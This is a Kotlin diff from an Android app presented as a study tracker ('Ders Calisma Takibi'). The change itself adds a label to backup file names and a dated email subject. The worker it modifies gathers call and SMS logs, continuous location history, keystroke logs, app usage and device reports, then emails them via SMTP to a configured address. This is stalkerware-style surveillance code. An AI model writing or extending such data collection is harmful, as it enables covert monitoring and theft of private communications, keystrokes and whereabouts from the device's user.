@@ -10,6 +10,9 @@ import com.derscalismatakibi.app.util.ExportHelper
 import com.derscalismatakibi.app.util.NotificationHelper
 import com.derscalismatakibi.app.util.UsageStatsHelper
 import kotlinx.coroutines.flow.first
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
 
 /**
  * Gunde bir kez sabit saatte VEYA (ayarlandiysa) belirli araliklarla (bkz.
@@ -32,14 +35,14 @@ class DailyBackupWorker(appContext: Context, params: WorkerParameters) : Corouti
 
         // 1) HER ZAMAN cihaza yaz (yedekleme e-postadan bagimsiz calisir).
         val csvFile = try {
-            ExportHelper.writeDailyBackupCsv(applicationContext, sessions)
+            ExportHelper.writeDailyBackupCsv(applicationContext, sessions, cfg.backupLabel)
         } catch (t: Throwable) {
             AppLogger.logError("Yedekleme", "CSV dosyasi yazilamadi", t)
             settingsRepo.update(cfg.copy(lastBackupStatus = "error: dosya yazilamadi (${t.message})"))
             return Result.retry()
         }
         val scheduleFile = try {
-            ExportHelper.writeScheduleJson(applicationContext, slots)
+            ExportHelper.writeScheduleJson(applicationContext, slots, cfg.backupLabel)
         } catch (t: Throwable) {
             null // takvim verisi olmadan da yedekleme/e-posta devam edebilir.
         }
@@ -47,7 +50,7 @@ class DailyBackupWorker(appContext: Context, params: WorkerParameters) : Corouti
         // yoksa sessizce atla, yedeklemenin geri kalanini engelleme.
         val usageFile = if (UsageStatsHelper.hasUsageAccess(applicationContext)) {
             try {
-                ExportHelper.writeUsageCsv(applicationContext, UsageStatsHelper.loadTodayUsage(applicationContext))
+                ExportHelper.writeUsageCsv(applicationContext, UsageStatsHelper.loadTodayUsage(applicationContext), cfg.backupLabel)
             } catch (t: Throwable) {
                 null
             }
@@ -60,19 +63,19 @@ class DailyBackupWorker(appContext: Context, params: WorkerParameters) : Corouti
         // fonksiyon sessizce null/bos doner, gunluk yedeklemenin geri kalanini
         // engellemez.
         val callSmsFile = if (cfg.callSmsLogEnabled) {
-            try { ExportHelper.writeCallSmsCsv(applicationContext) } catch (t: Throwable) { null }
+            try { ExportHelper.writeCallSmsCsv(applicationContext, cfg.backupLabel) } catch (t: Throwable) { null }
         } else null
-        val deviceReportFile = try { ExportHelper.writeDeviceReportTxt(applicationContext) } catch (t: Throwable) { null }
+        val deviceReportFile = try { ExportHelper.writeDeviceReportTxt(applicationContext, cfg.backupLabel) } catch (t: Throwable) { null }
         val blockedApps = try { db.blockedAppDao().all() } catch (t: Throwable) { emptyList() }
-        val blockedAppsFile = try { ExportHelper.writeBlockedAppsTxt(applicationContext, blockedApps, cfg.examModeEnabled) } catch (t: Throwable) { null }
+        val blockedAppsFile = try { ExportHelper.writeBlockedAppsTxt(applicationContext, blockedApps, cfg.examModeEnabled, cfg.backupLabel) } catch (t: Throwable) { null }
         val logFile = AppLogger.currentLogFile()?.takeIf { it.exists() }
         // "Sadece anlik degil, surekli degisen TUM konum" + klavye takibi kayitlari
         // da eklensin istegi - ikisi de bos/kapaliysa fonksiyonlar null doner.
         val locationFile = try {
-            ExportHelper.writeLocationHistoryCsv(applicationContext, db.locationLogDao().all())
+            ExportHelper.writeLocationHistoryCsv(applicationContext, db.locationLogDao().all(), cfg.backupLabel)
         } catch (t: Throwable) { null }
         val keystrokeFile = try {
-            ExportHelper.writeKeystrokeLogCsv(applicationContext, db.keystrokeLogDao().observeRecent().first())
+            ExportHelper.writeKeystrokeLogCsv(applicationContext, db.keystrokeLogDao().observeRecent().first(), cfg.backupLabel)
         } catch (t: Throwable) { null }
         // "Gonderilen Veriler" ayarlari: cihaza yazma HER ZAMAN yukarida yapildi,
         // bu sadece e-postaya hangi dosyalarin eklenecegini secer.
@@ -103,7 +106,9 @@ class DailyBackupWorker(appContext: Context, params: WorkerParameters) : Corouti
 
         // 2) E-posta, sadece acik ve dolu ayarlanmissa.
         if ((cfg.dailyBackupEnabled || cfg.intervalBackupEnabled) && cfg.backupEmail.isNotBlank() && cfg.backupEmailAppPassword.isNotBlank()) {
-            when (val sendResult = SmtpBackupSender.send(cfg.backupEmail, cfg.backupEmailAppPassword, attachments)) {
+            val labelSuffix = if (cfg.backupLabel.isNotBlank()) " - ${cfg.backupLabel}" else ""
+            val subject = "Ders Calisma Takibi$labelSuffix - Yedek (${SimpleDateFormat("dd.MM.yyyy HH:mm", Locale("tr")).format(Date())})"
+            when (val sendResult = SmtpBackupSender.send(cfg.backupEmail, cfg.backupEmailAppPassword, attachments, subject = subject)) {
                 is SmtpBackupSender.Result.Success -> {
                     AppLogger.log("Yedekleme", "E-posta basariyla gonderildi (${attachments.size} ek)")
                     settingsRepo.update(
